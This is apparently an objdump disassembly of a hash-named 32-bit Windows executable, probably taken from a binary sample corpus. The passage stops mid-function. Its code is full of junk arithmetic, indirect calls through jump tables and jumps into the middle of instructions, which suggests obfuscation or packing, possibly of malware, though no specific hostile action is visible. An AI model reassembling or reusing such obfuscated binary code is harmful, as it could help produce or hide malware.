
df12e7f322e9bb39296304bbaa479eba3d9628dd22fe13ec0dbaf8815f746d00.exe:     file format pei-i386


Disassembly of section .text:

004cd000 <.text>:
  4cd000:	pop    edi
  4cd001:	xor    eax,eax
  4cd003:	call   DWORD PTR [eax*8+0x4cf72c]
  4cd00a:	push   edi
  4cd00b:	pop    edi
  4cd00c:	jmp    DWORD PTR [esp-0x4]
  4cd010:	mov    edi,edi
  4cd012:	push   ebp
  4cd013:	mov    ebp,esp
  4cd015:	sub    esp,0x60
  4cd018:	mov    ecx,0x4d00b0
  4cd01d:	or     eax,DWORD PTR [ecx-0x20]
  4cd020:	push   ecx
  4cd021:	push   DWORD PTR [ecx+0x154]
  4cd027:	push   DWORD PTR [ecx+0x38]
  4cd02a:	push   DWORD PTR [ecx+0x1a0]
  4cd030:	call   0x4cdfe8
  4cd035:	add    esp,0xc
  4cd038:	pop    ecx
  4cd039:	push   ecx
  4cd03a:	mov    esi,0x0
  4cd03f:	push   esi
  4cd040:	call   0x4cd0f0
  4cd045:	pop    ecx
  4cd046:	push   ecx
  4cd047:	call   0x4ce01c
  4cd04c:	pop    ecx
  4cd04d:	add    esp,0x60
  4cd050:	pop    ebp
  4cd051:	ret    
  4cd052:	add    BYTE PTR [eax],al
  4cd054:	mov    edi,edi
  4cd056:	push   ebp
  4cd057:	mov    ebp,esp
  4cd059:	sub    esp,0x40
  4cd05c:	mov    esi,0x4d0010
  4cd061:	mov    DWORD PTR [ebp-0x14],0xffffffec
  4cd068:	mov    eax,0x0
  4cd06d:	push   eax
  4cd06e:	call   0x4cd98c
  4cd073:	push   esi
  4cd074:	push   edx
  4cd075:	push   ebx
  4cd076:	push   eax
  4cd077:	push   DWORD PTR [esi+0x1e8]
  4cd07d:	call   0x4cd4d8
  4cd082:	add    esp,0x10
  4cd085:	pop    esi
  4cd086:	push   0x0
  4cd088:	call   0x4cd8fc
  4cd08d:	add    esp,0x40
  4cd090:	pop    ebp
  4cd091:	ret    
  4cd092:	add    BYTE PTR [eax],al
  4cd094:	pop    edi
  4cd095:	xor    eax,eax
  4cd097:	call   DWORD PTR [eax*8+0x4cf75c]
  4cd09e:	push   edi
  4cd09f:	pop    edi
  4cd0a0:	jmp    DWORD PTR [esp-0x4]
  4cd0a4:	mov    edi,edi
  4cd0a6:	push   ebp
  4cd0a7:	mov    ebp,esp
  4cd0a9:	sub    esp,0x60
  4cd0ac:	mov    edx,0x4d00a4
  4cd0b1:	cmp    edx,0x585f
  4cd0b7:	jbe    0x4cd0a7
  4cd0b9:	push   edx
  4cd0ba:	push   DWORD PTR [edx+0x1e4]
  4cd0c0:	push   esi
  4cd0c1:	call   0x4cdf9c
  4cd0c6:	add    esp,0x8
  4cd0c9:	pop    edx
  4cd0ca:	push   edx
  4cd0cb:	lea    eax,[edx-0xa4]
  4cd0d1:	push   eax
  4cd0d2:	call   0x4cdb90
  4cd0d7:	test   eax,eax
  4cd0d9:	jne    0x4cd0cb
  4cd0db:	pop    edx
  4cd0dc:	mov    edi,0x4cf6f0
  4cd0e1:	mov    edi,DWORD PTR [edi]
  4cd0e3:	push   edi
  4cd0e4:	push   DWORD PTR [edx+0x5c]
  4cd0e7:	pop    eax
  4cd0e8:	call   eax
  4cd0ea:	add    esp,0x60
  4cd0ed:	pop    ebp
  4cd0ee:	ret    
  4cd0ef:	add    BYTE PTR [edi+0x33],bl
  4cd0f2:	sar    bh,0x14
  4cd0f5:	lds    ebx,FWORD PTR [eax]
  4cd0f7:	test   DWORD PTR [eax+eax*1+0x57],0x2464ff5f
  4cd0ff:	cld    
  4cd100:	mov    edi,edi
  4cd102:	push   ebp
  4cd103:	mov    ebp,esp
  4cd105:	sub    esp,0x20
  4cd108:	mov    eax,0x4d00c8
  4cd10d:	sbb    ecx,0xffffff8d
  4cd110:	push   eax
  4cd111:	push   0x0
  4cd113:	call   0x4cd8fc
  4cd118:	pop    eax
  4cd119:	push   eax
  4cd11a:	push   DWORD PTR [eax+0xc8]
  4cd120:	push   DWORD PTR [eax+0x6c]
  4cd123:	call   0x4cd46c
  4cd128:	add    esp,0x8
  4cd12b:	pop    eax
  4cd12c:	push   eax
  4cd12d:	lea    ecx,[eax-0xc8]
  4cd133:	push   ecx
  4cd134:	call   0x4cdb90
  4cd139:	test   eax,eax
  4cd13b:	jne    0x4cd12d
  4cd13d:	pop    eax
  4cd13e:	add    esp,0x20
  4cd141:	pop    ebp
  4cd142:	ret    
  4cd143:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd149:	sub    esp,0x2c
  4cd14c:	lea    esi,ds:0x4d0100
  4cd152:	xor    eax,DWORD PTR [esi+0x48]
  4cd155:	push   esi
  4cd156:	push   DWORD PTR [esi+0x170]
  4cd15c:	push   ebx
  4cd15d:	push   DWORD PTR [esi+0x1dc]
  4cd163:	call   0x4cdd48
  4cd168:	add    esp,0xc
  4cd16b:	pop    esi
  4cd16c:	push   0xfffffff4
  4cd16e:	call   0x4cddc8
  4cd173:	push   0x0
  4cd175:	call   0x4cd0f0
  4cd17a:	add    esp,0x2c
  4cd17d:	pop    ebp
  4cd17e:	ret    
  4cd17f:	add    BYTE PTR [edi+0x33],bl
  4cd182:	sar    bh,0x14
  4cd185:	lds    esi,FWORD PTR [eax]
  4cd187:	test   DWORD PTR [eax+eax*1+0x57],0x2464ff5f
  4cd18f:	cld    
  4cd190:	mov    edi,edi
  4cd192:	push   ebp
  4cd193:	mov    ebp,esp
  4cd195:	sub    esp,0x20
  4cd198:	mov    eax,0x4d01f0
  4cd19d:	sub    ebx,0xffffe2dc
  4cd1a3:	push   eax
  4cd1a4:	push   0xfffffff4
  4cd1a6:	call   0x4cddc8
  4cd1ab:	pop    eax
  4cd1ac:	push   eax
  4cd1ad:	push   DWORD PTR [eax+0x1a8]
  4cd1b3:	push   DWORD PTR [eax+0x60]
  4cd1b6:	call   0x4cdebc
  4cd1bb:	add    esp,0x8
  4cd1be:	pop    eax
  4cd1bf:	push   eax
  4cd1c0:	mov    ebx,0x0
  4cd1c5:	push   ebx
  4cd1c6:	call   0x4cd838
  4cd1cb:	pop    eax
  4cd1cc:	add    esp,0x20
  4cd1cf:	pop    ebp
  4cd1d0:	ret    
  4cd1d1:	add    BYTE PTR [eax],al
  4cd1d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd1d9:	sub    esp,0x3c
  4cd1dc:	mov    esi,0x4d00d8
  4cd1e1:	mov    edx,DWORD PTR [esi+0xec]
  4cd1e7:	push   esi
  4cd1e8:	push   DWORD PTR [esi+0x130]
  4cd1ee:	push   edx
  4cd1ef:	push   edi
  4cd1f0:	call   0x4cde78
  4cd1f5:	add    esp,0xc
  4cd1f8:	pop    esi
  4cd1f9:	call   0x4ce01c
  4cd1fe:	push   0x0
  4cd200:	call   0x4cdba0
  4cd205:	add    esp,0x3c
  4cd208:	pop    ebp
  4cd209:	ret    
  4cd20a:	add    BYTE PTR [eax],al
  4cd20c:	pop    edi
  4cd20d:	xor    eax,eax
  4cd20f:	call   DWORD PTR [eax*8+0x4cf720]
  4cd216:	push   edi
  4cd217:	pop    edi
  4cd218:	jmp    DWORD PTR [esp-0x4]
  4cd21c:	mov    edi,edi
  4cd21e:	push   ebp
  4cd21f:	mov    ebp,esp
  4cd221:	sub    esp,0x44
  4cd224:	mov    edi,0x4d00dc
  4cd229:	xor    DWORD PTR [edi+0x74],0xf8b
  4cd230:	push   edi
  4cd231:	push   0x0
  4cd233:	call   0x4cd344
  4cd238:	pop    edi
  4cd239:	push   edi
  4cd23a:	push   DWORD PTR [edi+0x1b0]
  4cd240:	push   ebx
  4cd241:	push   ebx
  4cd242:	push   DWORD PTR [edi+0x94]
  4cd248:	call   0x4cd264
  4cd24d:	add    esp,0x10
  4cd250:	pop    edi
  4cd251:	push   edi
  4cd252:	mov    ebx,0x0
  4cd257:	push   ebx
  4cd258:	call   0x4cd98c
  4cd25d:	pop    edi
  4cd25e:	add    esp,0x44
  4cd261:	pop    ebp
  4cd262:	ret    
  4cd263:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd269:	sub    esp,0x48
  4cd26c:	lea    ecx,[edi-0x94]
  4cd272:	sub    DWORD PTR [ecx+0x12c],0xfffffff8
  4cd279:	push   ecx
  4cd27a:	push   edi
  4cd27b:	push   DWORD PTR [ecx+0x28]
  4cd27e:	call   0x4cdb40
  4cd283:	add    esp,0x8
  4cd286:	pop    ecx
  4cd287:	push   ecx
  4cd288:	call   0x4cdd98
  4cd28d:	pop    ecx
  4cd28e:	push   ecx
  4cd28f:	push   0x0
  4cd291:	call   0x4cdba0
  4cd296:	pop    ecx
  4cd297:	add    esp,0x48
  4cd29a:	pop    ebp
  4cd29b:	ret    
  4cd29c:	pop    edi
  4cd29d:	xor    eax,eax
  4cd29f:	call   DWORD PTR [eax*8+0x4cf6f8]
  4cd2a6:	push   edi
  4cd2a7:	pop    edi
  4cd2a8:	jmp    DWORD PTR [esp-0x4]
  4cd2ac:	pop    edi
  4cd2ad:	xor    eax,eax
  4cd2af:	call   DWORD PTR [eax*8+0x4cf748]
  4cd2b6:	push   edi
  4cd2b7:	pop    edi
  4cd2b8:	jmp    DWORD PTR [esp-0x4]
  4cd2bc:	mov    edi,edi
  4cd2be:	push   ebp
  4cd2bf:	mov    ebp,esp
  4cd2c1:	sub    esp,0x50
  4cd2c4:	lea    ebx,ds:0x4d0078
  4cd2ca:	adc    DWORD PTR [ebp-0x38],0xffffd236
  4cd2d1:	push   ebx
  4cd2d2:	push   DWORD PTR [ebx+0x68]
  4cd2d5:	push   DWORD PTR [ebx+0xa4]
  4cd2db:	push   DWORD PTR [ebx+0x14c]
  4cd2e1:	push   DWORD PTR [ebx+0x50]
  4cd2e4:	call   0x4cddd8
  4cd2e9:	add    esp,0x10
  4cd2ec:	pop    ebx
  4cd2ed:	push   0x0
  4cd2ef:	call   0x4cd344
  4cd2f4:	mov    edi,0x0
  4cd2f9:	push   edi
  4cd2fa:	call   0x4cd8fc
  4cd2ff:	add    esp,0x50
  4cd302:	pop    ebp
  4cd303:	ret    
  4cd304:	mov    edi,edi
  4cd306:	push   ebp
  4cd307:	mov    ebp,esp
  4cd309:	sub    esp,0x60
  4cd30c:	mov    ebx,0x4d008c
  4cd311:	sub    DWORD PTR [ebx+0x80],edi
  4cd317:	push   ebx
  4cd318:	push   esi
  4cd319:	push   DWORD PTR [ebx+0xdc]
  4cd31f:	call   0x4cd428
  4cd324:	add    esp,0x8
  4cd327:	pop    ebx
  4cd328:	lea    ecx,[ebx-0x8c]
  4cd32e:	push   ecx
  4cd32f:	call   0x4cdb90
  4cd334:	test   eax,eax
  4cd336:	jne    0x4cd329
  4cd338:	push   0x0
  4cd33a:	call   0x4cd8fc
  4cd33f:	add    esp,0x60
  4cd342:	pop    ebp
  4cd343:	ret    
  4cd344:	pop    edi
  4cd345:	xor    eax,eax
  4cd347:	call   DWORD PTR [eax*8+0x4cf744]
  4cd34e:	push   edi
  4cd34f:	pop    edi
  4cd350:	jmp    DWORD PTR [esp-0x4]
  4cd354:	mov    edi,edi
  4cd356:	push   ebp
  4cd357:	mov    ebp,esp
  4cd359:	sub    esp,0x48
  4cd35c:	lea    eax,[edx-0x1a8]
  4cd362:	sub    DWORD PTR [ebp-0x44],0xffffffa0
  4cd366:	push   eax
  4cd367:	push   0x0
  4cd369:	call   0x4cd0f0
  4cd36e:	pop    eax
  4cd36f:	push   eax
  4cd370:	push   DWORD PTR [eax+0x1e4]
  4cd376:	push   DWORD PTR [eax+0x1d8]
  4cd37c:	push   edi
  4cd37d:	call   0x4cd65c
  4cd382:	add    esp,0xc
  4cd385:	pop    eax
  4cd386:	push   eax
  4cd387:	push   0x0
  4cd389:	call   0x4cdf3c
  4cd38e:	pop    eax
  4cd38f:	add    esp,0x48
  4cd392:	pop    ebp
  4cd393:	ret    
  4cd394:	pop    edi
  4cd395:	xor    eax,eax
  4cd397:	call   DWORD PTR [eax*8+0x4cf6e8]
  4cd39e:	push   edi
  4cd39f:	pop    edi
  4cd3a0:	jmp    DWORD PTR [esp-0x4]
  4cd3a4:	mov    edi,edi
  4cd3a6:	push   ebp
  4cd3a7:	mov    ebp,esp
  4cd3a9:	sub    esp,0x2c
  4cd3ac:	lea    esi,ds:0x4d01ec
  4cd3b2:	adc    DWORD PTR [ebp-0x10],0x7d1f
  4cd3b9:	push   esi
  4cd3ba:	push   DWORD PTR [esi+0x180]
  4cd3c0:	push   ebx
  4cd3c1:	call   0x4cdbec
  4cd3c6:	add    esp,0x8
  4cd3c9:	pop    esi
  4cd3ca:	mov    ebx,0x0
  4cd3cf:	push   ebx
  4cd3d0:	call   0x4cd8fc
  4cd3d5:	mov    ebx,0x0
  4cd3da:	push   ebx
  4cd3db:	call   0x4cddb8
  4cd3e0:	add    esp,0x2c
  4cd3e3:	pop    ebp
  4cd3e4:	ret    
  4cd3e5:	add    BYTE PTR [eax],al
  4cd3e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd3ed:	sub    esp,0x58
  4cd3f0:	lea    edi,[eax+0x4c]
  4cd3f3:	adc    DWORD PTR [ebp-0x30],edx
  4cd3f6:	push   edi
  4cd3f7:	call   0x4cdd98
  4cd3fc:	pop    edi
  4cd3fd:	push   edi
  4cd3fe:	push   esi
  4cd3ff:	push   eax
  4cd400:	push   ebx
  4cd401:	push   ebx
  4cd402:	call   0x4cd010
  4cd407:	add    esp,0x10
  4cd40a:	pop    edi
  4cd40b:	push   edi
  4cd40c:	call   0x4cd394
  4cd411:	pop    edi
  4cd412:	add    esp,0x58
  4cd415:	pop    ebp
  4cd416:	ret    
  4cd417:	add    BYTE PTR [edi+0x33],bl
  4cd41a:	sar    bh,0x14
  4cd41d:	lds    ebp,FWORD PTR [eax]
  4cd41f:	test   DWORD PTR [eax+eax*1+0x57],0x2464ff5f
  4cd427:	cld    
  4cd428:	mov    edi,edi
  4cd42a:	push   ebp
  4cd42b:	mov    ebp,esp
  4cd42d:	sub    esp,0x48
  4cd430:	lea    ecx,[ebx-0x18]
  4cd433:	adc    DWORD PTR [ebp-0x18],edx
  4cd436:	push   ecx
  4cd437:	mov    edi,0x0
  4cd43c:	push   edi
  4cd43d:	call   0x4cdf3c
  4cd442:	pop    ecx
  4cd443:	push   ecx
  4cd444:	push   edi
  4cd445:	push   DWORD PTR [ecx+0x188]
  4cd44b:	push   DWORD PTR [ecx+0x19c]
  4cd451:	push   esi
  4cd452:	call   0x4cd564
  4cd457:	add    esp,0x10
  4cd45a:	pop    ecx
  4cd45b:	push   ecx
  4cd45c:	push   0x0
  4cd45e:	call   0x4cd8fc
  4cd463:	pop    ecx
  4cd464:	add    esp,0x48
  4cd467:	pop    ebp
  4cd468:	ret    
  4cd469:	add    BYTE PTR [eax],al
  4cd46b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd471:	sub    esp,0x40
  4cd474:	lea    ecx,ds:0x4d008c
  4cd47a:	xor    DWORD PTR [ebp-0x34],0x477a
  4cd481:	push   ecx
  4cd482:	push   0x0
  4cd484:	call   0x4cd4c8
  4cd489:	pop    ecx
  4cd48a:	push   ecx
  4cd48b:	push   esi
  4cd48c:	push   edx
  4cd48d:	push   edi
  4cd48e:	call   0x4cd8c0
  4cd493:	add    esp,0xc
  4cd496:	pop    ecx
  4cd497:	push   ecx
  4cd498:	push   0x0
  4cd49a:	call   0x4cdf3c
  4cd49f:	pop    ecx
  4cd4a0:	add    esp,0x40
  4cd4a3:	pop    ebp
  4cd4a4:	ret    
  4cd4a5:	add    BYTE PTR [eax],al
  4cd4a7:	add    BYTE PTR [edi+0x33],bl
  4cd4aa:	sar    bh,0x14
  4cd4ad:	lds    edx,FWORD PTR [eax-0x9]
  4cd4b0:	dec    esp
  4cd4b1:	add    BYTE PTR [edi+0x5f],dl
  4cd4b4:	jmp    DWORD PTR [esp-0x4]
  4cd4b8:	pop    edi
  4cd4b9:	xor    eax,eax
  4cd4bb:	call   DWORD PTR [eax*8+0x4cf788]
  4cd4c2:	push   edi
  4cd4c3:	pop    edi
  4cd4c4:	jmp    DWORD PTR [esp-0x4]
  4cd4c8:	pop    edi
  4cd4c9:	xor    eax,eax
  4cd4cb:	call   DWORD PTR [eax*8+0x4cf754]
  4cd4d2:	push   edi
  4cd4d3:	pop    edi
  4cd4d4:	jmp    DWORD PTR [esp-0x4]
  4cd4d8:	mov    edi,edi
  4cd4da:	push   ebp
  4cd4db:	mov    ebp,esp
  4cd4dd:	sub    esp,0x24
  4cd4e0:	lea    ecx,[esi+0xd0]
  4cd4e6:	adc    DWORD PTR [ebp-0xc],0x6b
  4cd4ea:	push   ecx
  4cd4eb:	mov    esi,0x0
  4cd4f0:	push   esi
  4cd4f1:	call   0x4cdba0
  4cd4f6:	pop    ecx
  4cd4f7:	push   ecx
  4cd4f8:	push   DWORD PTR [ecx+0x1c8]
  4cd4fe:	push   DWORD PTR [ecx+0xc4]
  4cd504:	call   0x4cd6a0
  4cd509:	add    esp,0x8
  4cd50c:	pop    ecx
  4cd50d:	push   ecx
  4cd50e:	push   0x0
  4cd510:	call   0x4cdf3c
  4cd515:	pop    ecx
  4cd516:	add    esp,0x24
  4cd519:	pop    ebp
  4cd51a:	ret    
  4cd51b:	add    BYTE PTR [edi+0x33],dl
  4cd51e:	call   DWORD PTR [edi+0x57]
  4cd521:	push   edi
  4cd522:	push   edi
  4cd523:	call   0x4cddc8
  4cd528:	sub    esp,0x4
  4cd52b:	call   0x4cd29c
  4cd530:	push   0x2
  4cd532:	xor    eax,eax
  4cd534:	xor    eax,0x4d00a0
  4cd539:	push   0x0
  4cd53b:	inc    DWORD PTR ds:0x4d00a6
  4cd541:	push   eax
  4cd542:	call   0x4cd418
  4cd547:	pop    edi
  4cd548:	lea    edi,[eax+0x3b]
  4cd54b:	mov    edi,DWORD PTR [edi]
  4cd54d:	lea    eax,[eax+edi*1]
  4cd550:	add    eax,0x28
  4cd553:	mov    eax,DWORD PTR [eax]
  4cd555:	pusha  
  4cd556:	mov    ah,0x30
  4cd558:	sub    al,ah
  4cd55a:	jb     0x4cd562
  4cd55c:	jg     0x4cd0a4
  4cd562:	popa   
  4cd563:	ret    
  4cd564:	mov    edi,edi
  4cd566:	push   ebp
  4cd567:	mov    ebp,esp
  4cd569:	sub    esp,0x58
  4cd56c:	mov    edx,0x4d0174
  4cd571:	or     ecx,DWORD PTR [ebp-0x34]
  4cd574:	push   edx
  4cd575:	push   eax
  4cd576:	push   eax
  4cd577:	push   DWORD PTR [edx+0x40]
  4cd57a:	push   DWORD PTR [edx+0x1a4]
  4cd580:	call   0x4cd21c
  4cd585:	add    esp,0x10
  4cd588:	pop    edx
  4cd589:	push   edx
  4cd58a:	push   0x0
  4cd58c:	call   0x4cd344
  4cd591:	pop    edx
  4cd592:	push   edx
  4cd593:	call   0x4cdcc0
  4cd598:	pop    edx
  4cd599:	add    esp,0x58
  4cd59c:	pop    ebp
  4cd59d:	ret    
  4cd59e:	add    BYTE PTR [eax],al
  4cd5a0:	mov    edi,edi
  4cd5a2:	push   ebp
  4cd5a3:	mov    ebp,esp
  4cd5a5:	sub    esp,0x60
  4cd5a8:	lea    ebx,ds:0x4d0170
  4cd5ae:	cmp    ebx,0x2ae7
  4cd5b4:	jb     0x4cd5a3
  4cd5b6:	push   ebx
  4cd5b7:	push   DWORD PTR [ebx+0x11c]
  4cd5bd:	push   DWORD PTR [ebx+0x8]
  4cd5c0:	call   0x4cdbb0
  4cd5c5:	add    esp,0x8
  4cd5c8:	pop    ebx
  4cd5c9:	call   0x4cdd98
  4cd5ce:	mov    edi,0xfffffff4
  4cd5d3:	push   edi
  4cd5d4:	call   0x4cddc8
  4cd5d9:	add    esp,0x60
  4cd5dc:	pop    ebp
  4cd5dd:	ret    
  4cd5de:	add    BYTE PTR [eax],al
  4cd5e0:	mov    edi,edi
  4cd5e2:	push   ebp
  4cd5e3:	mov    ebp,esp
  4cd5e5:	sub    esp,0x24
  4cd5e8:	lea    esi,ds:0x4d0020
  4cd5ee:	xor    ecx,DWORD PTR [ebp-0xc]
  4cd5f1:	push   esi
  4cd5f2:	push   ebx
  4cd5f3:	push   ebx
  4cd5f4:	call   0x4cda5c
  4cd5f9:	add    esp,0x8
  4cd5fc:	pop    esi
  4cd5fd:	mov    eax,0x0
  4cd602:	push   eax
  4cd603:	call   0x4cd98c
  4cd608:	call   0x4cdcc0
  4cd60d:	add    esp,0x24
  4cd610:	pop    ebp
  4cd611:	ret    
  4cd612:	add    BYTE PTR [eax],al
  4cd614:	mov    edi,edi
  4cd616:	push   ebp
  4cd617:	mov    ebp,esp
  4cd619:	sub    esp,0x40
  4cd61c:	mov    esi,0x4d01dc
  4cd621:	sbb    edi,0x14
  4cd624:	push   esi
  4cd625:	push   DWORD PTR [esi+0x144]
  4cd62b:	push   ecx
  4cd62c:	push   edi
  4cd62d:	push   DWORD PTR [esi+0xa8]
  4cd633:	call   0x4cdd00
  4cd638:	add    esp,0x10
  4cd63b:	pop    esi
  4cd63c:	lea    ecx,[esi-0x1dc]
  4cd642:	push   ecx
  4cd643:	call   0x4cdb90
  4cd648:	test   eax,eax
  4cd64a:	jne    0x4cd63d
  4cd64c:	mov    eax,0x0
  4cd651:	push   eax
  4cd652:	call   0x4cdf3c
  4cd657:	add    esp,0x40
  4cd65a:	pop    ebp
  4cd65b:	ret    
  4cd65c:	mov    edi,edi
  4cd65e:	push   ebp
  4cd65f:	mov    ebp,esp
  4cd661:	sub    esp,0x34
  4cd664:	lea    edx,ds:0x4d015c
  4cd66a:	cmp    edx,0x47ba
  4cd670:	je     0x4cd65f
  4cd672:	push   edx
  4cd673:	mov    ecx,0x0
  4cd678:	push   ecx
  4cd679:	call   0x4cd0f0
  4cd67e:	pop    edx
  4cd67f:	push   edx
  4cd680:	push   ebx
  4cd681:	push   ebx
  4cd682:	push   DWORD PTR [edx+0x164]
  4cd688:	push   esi
  4cd689:	call   0x4cd848
  4cd68e:	add    esp,0x10
  4cd691:	pop    edx
  4cd692:	push   edx
  4cd693:	push   0x0
  4cd695:	call   0x4cd4c8
  4cd69a:	pop    edx
  4cd69b:	add    esp,0x34
  4cd69e:	pop    ebp
  4cd69f:	ret    
  4cd6a0:	mov    edi,edi
  4cd6a2:	push   ebp
  4cd6a3:	mov    ebp,esp
  4cd6a5:	sub    esp,0x28
  4cd6a8:	lea    esi,[ecx+0xc4]
  4cd6ae:	or     DWORD PTR [ebp-0x18],0xffffffa7
  4cd6b2:	push   0x0
  4cd6b4:	call   0x4cd98c
  4cd6b9:	push   esi
  4cd6ba:	push   DWORD PTR [esi+0x16c]
  4cd6c0:	push   DWORD PTR [esi+0x1b0]
  4cd6c6:	push   DWORD PTR [esi+0x70]
  4cd6c9:	call   0x4cd2bc
  4cd6ce:	add    esp,0xc
  4cd6d1:	pop    esi
  4cd6d2:	call   0x4cdcc0
  4cd6d7:	add    esp,0x28
  4cd6da:	pop    ebp
  4cd6db:	ret    
  4cd6dc:	mov    edi,edi
  4cd6de:	push   ebp
  4cd6df:	mov    ebp,esp
  4cd6e1:	sub    esp,0x30
  4cd6e4:	lea    eax,[esi-0xb4]
  4cd6ea:	and    edx,DWORD PTR [ebp-0x1c]
  4cd6ed:	push   eax
  4cd6ee:	push   esi
  4cd6ef:	push   DWORD PTR [eax+0x1d8]
  4cd6f5:	push   DWORD PTR [eax+0x64]
  4cd6f8:	push   DWORD PTR [eax+0x48]
  4cd6fb:	call   0x4cdef8
  4cd700:	add    esp,0x10
  4cd703:	pop    eax
  4cd704:	push   eax
  4cd705:	push   0x0
  4cd707:	call   0x4cddb8
  4cd70c:	pop    eax
  4cd70d:	push   eax
  4cd70e:	mov    esi,0x0
  4cd713:	push   esi
  4cd714:	call   0x4cd98c
  4cd719:	pop    eax
  4cd71a:	add    esp,0x30
  4cd71d:	pop    ebp
  4cd71e:	ret    
  4cd71f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd725:	sub    esp,0x28
  4cd728:	mov    edx,0x4d0084
  4cd72d:	cmp    edx,0x707b
  4cd733:	jbe    0x4cd723
  4cd735:	push   edx
  4cd736:	mov    ebx,0x0
  4cd73b:	push   ebx
  4cd73c:	call   0x4cd0f0
  4cd741:	pop    edx
  4cd742:	push   edx
  4cd743:	push   DWORD PTR [edx+0x84]
  4cd749:	push   DWORD PTR [edx+0xd4]
  4cd74f:	push   DWORD PTR [edx+0x7c]
  4cd752:	call   0x4cd76c
  4cd757:	add    esp,0xc
  4cd75a:	pop    edx
  4cd75b:	push   edx
  4cd75c:	push   0x0
  4cd75e:	call   0x4cd98c
  4cd763:	pop    edx
  4cd764:	add    esp,0x28
  4cd767:	pop    ebp
  4cd768:	ret    
  4cd769:	add    BYTE PTR [eax],al
  4cd76b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd771:	sub    esp,0x50
  4cd774:	lea    edi,ds:0x4d0084
  4cd77a:	xor    esi,DWORD PTR [ebp-0xc]
  4cd77d:	push   edi
  4cd77e:	push   DWORD PTR [edi+0x1dc]
  4cd784:	push   ebx
  4cd785:	push   DWORD PTR [edi+0x120]
  4cd78b:	push   esi
  4cd78c:	call   0x4cda18
  4cd791:	add    esp,0x10
  4cd794:	pop    edi
  4cd795:	push   edi
  4cd796:	mov    eax,0x0
  4cd79b:	push   eax
  4cd79c:	call   0x4cd98c
  4cd7a1:	pop    edi
  4cd7a2:	push   edi
  4cd7a3:	push   0x0
  4cd7a5:	call   0x4cddb8
  4cd7aa:	pop    edi
  4cd7ab:	add    esp,0x50
  4cd7ae:	pop    ebp
  4cd7af:	ret    
  4cd7b0:	mov    edi,edi
  4cd7b2:	push   ebp
  4cd7b3:	mov    ebp,esp
  4cd7b5:	sub    esp,0x24
  4cd7b8:	lea    edx,[ebx-0x78]
  4cd7bb:	cmp    edx,0x24c7
  4cd7c1:	jbe    0x4cd7b3
  4cd7c3:	push   edx
  4cd7c4:	push   esi
  4cd7c5:	push   DWORD PTR [edx+0x120]
  4cd7cb:	push   eax
  4cd7cc:	call   0x4cd5a0
  4cd7d1:	add    esp,0xc
  4cd7d4:	pop    edx
  4cd7d5:	push   edx
  4cd7d6:	push   0x0
  4cd7d8:	call   0x4cdba0
  4cd7dd:	pop    edx
  4cd7de:	push   edx
  4cd7df:	lea    edi,[edx-0x180]
  4cd7e5:	push   edi
  4cd7e6:	call   0x4cdb90
  4cd7eb:	test   eax,eax
  4cd7ed:	jne    0x4cd7df
  4cd7ef:	pop    edx
  4cd7f0:	add    esp,0x24
  4cd7f3:	pop    ebp
  4cd7f4:	ret    
  4cd7f5:	add    BYTE PTR [eax],al
  4cd7f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd7fd:	sub    esp,0x50
  4cd800:	lea    ebx,ds:0x4d0170
  4cd806:	and    DWORD PTR [ebp-0x48],ebx
  4cd809:	push   ebx
  4cd80a:	push   edx
  4cd80b:	push   eax
  4cd80c:	push   esi
  4cd80d:	call   0x4cd054
  4cd812:	add    esp,0xc
  4cd815:	pop    ebx
  4cd816:	call   0x4cd394
  4cd81b:	push   0x0
  4cd81d:	call   0x4cdba0
  4cd822:	add    esp,0x50
  4cd825:	pop    ebp
  4cd826:	ret    
  4cd827:	add    BYTE PTR [edi+0x33],bl
  4cd82a:	sar    bh,0x14
  4cd82d:	lds    esi,FWORD PTR [edi+esi*8+0x4c]
  4cd831:	add    BYTE PTR [edi+0x5f],dl
  4cd834:	jmp    DWORD PTR [esp-0x4]
  4cd838:	pop    edi
  4cd839:	xor    eax,eax
  4cd83b:	call   DWORD PTR [eax*8+0x4cf6ec]
  4cd842:	push   edi
  4cd843:	pop    edi
  4cd844:	jmp    DWORD PTR [esp-0x4]
  4cd848:	mov    edi,edi
  4cd84a:	push   ebp
  4cd84b:	mov    ebp,esp
  4cd84d:	sub    esp,0x30
  4cd850:	lea    ebx,ds:0x4d01a0
  4cd856:	sub    DWORD PTR [ebx-0x160],0x215b
  4cd860:	push   0xfffffff4
  4cd862:	call   0x4cddc8
  4cd867:	push   ebx
  4cd868:	push   esi
  4cd869:	push   edx
  4cd86a:	push   DWORD PTR [ebx+0xf4]
  4cd870:	call   0x4cd9dc
  4cd875:	add    esp,0xc
  4cd878:	pop    ebx
  4cd879:	mov    ecx,0x0
  4cd87e:	push   ecx
  4cd87f:	call   0x4cddb8
  4cd884:	add    esp,0x30
  4cd887:	pop    ebp
  4cd888:	ret    
  4cd889:	add    BYTE PTR [eax],al
  4cd88b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd891:	sub    esp,0x30
  4cd894:	lea    esi,ds:0x4d01e4
  4cd89a:	or     edi,0xffffffe4
  4cd89d:	push   esi
  4cd89e:	push   edx
  4cd89f:	push   ebx
  4cd8a0:	push   ecx
  4cd8a1:	call   0x4cd94c
  4cd8a6:	add    esp,0xc
  4cd8a9:	pop    esi
  4cd8aa:	mov    ebx,0x0
  4cd8af:	push   ebx
  4cd8b0:	call   0x4cddb8
  4cd8b5:	call   0x4ce01c
  4cd8ba:	add    esp,0x30
  4cd8bd:	pop    ebp
  4cd8be:	ret    
  4cd8bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd8c5:	sub    esp,0x2c
  4cd8c8:	lea    edx,[ecx-0x40]
  4cd8cb:	or     DWORD PTR [edx+0xa0],edx
  4cd8d1:	push   edx
  4cd8d2:	push   DWORD PTR [edx+0x180]
  4cd8d8:	push   esi
  4cd8d9:	push   eax
  4cd8da:	call   0x4cd9ac
  4cd8df:	add    esp,0xc
  4cd8e2:	pop    edx
  4cd8e3:	push   edx
  4cd8e4:	call   0x4cdd98
  4cd8e9:	pop    edx
  4cd8ea:	push   edx
  4cd8eb:	mov    eax,0x0
  4cd8f0:	push   eax
  4cd8f1:	call   0x4cdba0
